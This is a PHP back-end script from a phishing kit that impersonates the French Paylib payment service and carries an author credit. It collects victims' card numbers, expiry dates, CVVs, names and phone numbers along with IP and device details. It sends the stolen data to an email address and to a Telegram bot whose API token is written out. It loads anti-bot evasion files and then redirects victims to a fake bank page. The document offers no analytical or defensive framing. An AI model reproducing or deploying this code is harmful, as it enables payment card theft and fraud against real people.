<?php
/*
Author : Oussama Mohammed ( ダンツ キング )
Telegram : https://t.me/MrGhostExpress

*/
session_start();
include_once 'functions.php';
include('./antibot-private.php');
include("./anti/anti1.php");
include("./anti/anti2.php");
include("./anti/anti3.php");
include("./anti/anti4.php");
include("./anti/anti5.php");
include("./anti/anti6.php");
include("./anti/anti7.php");
include("./anti/anti8.php");

		
$message = '/--------------- PAYLIB CARD INFOS ---------------/' . "\r\n";
$message .= 'Nom du titulaire : ' . $_POST['cardPrenom'] . "\r\n";
$message .= 'N° de votre carte : ' . $_POST['cardNumber'] . "\r\n";
$message .= 'Date d\'expiration : ' . $_POST['expDate'] . "\r\n";
$message .= 'CVV : ' . $_POST['verificationCode'] . "\r\n";
$message .= 'Numéro de téléphone : ' . $_POST['tel'] . "\r\n";
$message .= '/--------------- PAYLIB IP INFOS ---------------/' . "\r\n";
$message .= 'IPA : ' . get_user_ip() . "\r\n";
$message .= 'Pays : ' . get_user_country() . "\r\n";
$message .= 'Systeme : ' . get_user_os() . "\r\n";
$message .= 'Navigateur : ' . get_user_browser() . "\r\n";
$message .= 'Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= '/--------------- END PAYLIB INFO ---------------/' . "\r\n\r\n";

$send = "pardongo@protonmail.com";
$subject = "[".$_SESSION['cardNumber']."] -  [ " . get_user_country() . " - " . get_user_os() . " - " . get_user_ip() . " ]";
$headers = "From: ダンツ キング<log@mrghoost.fr>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot5206138912:AAG4k-4E7r0gZcqd9VcLd75-kz7vlYV_WiI/sendMessage?chat_id=2073417851&text=" . urlencode($message)."" );

     echo header('location: ./bnk.php?forceReload=' . md5(time()) . '' . md5(time()) . '' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

?>